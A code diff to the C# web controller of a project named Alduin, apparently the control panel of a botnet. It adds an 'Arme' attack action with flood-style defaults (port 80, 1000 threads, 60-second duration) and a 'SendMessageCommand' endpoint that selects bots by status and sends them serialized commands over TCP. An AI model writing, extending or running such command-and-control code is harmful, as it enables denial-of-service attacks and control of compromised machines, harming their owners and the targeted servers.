@@ -59,9 +59,28 @@ namespace Alduin.Web.Controllers
         }
         [Authorize]
         [HttpGet]
+        public IActionResult SendMessage()
+        {
+            return PartialView("_Message");
+        }
+        [Authorize]
+        [HttpGet]
         public IActionResult OpenWebsite()
         {
             return PartialView("_OpenWebsite");
+        }
+        [Authorize]
+        [HttpGet]
+        public IActionResult Arme()
+        {
+            var model = new ArmeModel
+            {
+                Port = 80,
+                PostDATA = "Dabala DUDU",
+                ThreadstoUse = 1000,
+                Time = 60
+            };
+            return PartialView("_ARME", model);
         }
         [Authorize]
         [HttpPost]
@@ -99,7 +118,7 @@ namespace Alduin.Web.Controllers
         }
         [Authorize]
         [HttpPost]
-        public async Task<IActionResult> WebOpenCommandAsync(WebsiteModel model)
+        public async Task<IActionResult> WebOpenCommand(WebsiteModel model)
         {
             if (!ModelState.IsValid)
                 return View(model);
@@ -128,6 +147,32 @@ namespace Alduin.Web.Controllers
             };
             var botlist = await _mediator.Send(bots);
             var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(command).Replace(@"\", ""));
+            return Json(response);
+        }
+        [Authorize]
+        [HttpPost]
+        public async Task<IActionResult> SendMessageCommand(MessageModel model)
+        {
+            var method = new BaseCommands
+            {
+                Method = "Message"
+            };
+            var messageVariables = new MessageVariables 
+            { 
+                Msg = model.Msg,
+                Closed = model.Closed
+            };
+            var messageCommand = new MessageCommand
+            {
+                newMessageVariables = messageVariables,
+                newBaseCommand = method,
+            };
+            var bots = new GetBotsByStatusQuery
+            {
+                status = model.Force
+            };
+            var botlist = await _mediator.Send(bots);
+            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(messageCommand).Replace(@"\", ""));
             return Json(response);
         }
     }
